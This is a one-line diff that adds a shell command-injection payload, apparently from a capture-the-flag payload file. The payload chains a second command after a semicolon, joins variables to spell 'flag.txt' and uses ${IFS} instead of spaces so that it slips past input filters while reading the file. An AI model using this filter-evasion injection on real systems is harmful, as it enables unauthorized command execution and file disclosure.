@@ -1,0 +1,1 @@
+hash3liZer;a="fl";b="ag.tx";cat${IFS}"${a}${b}t"
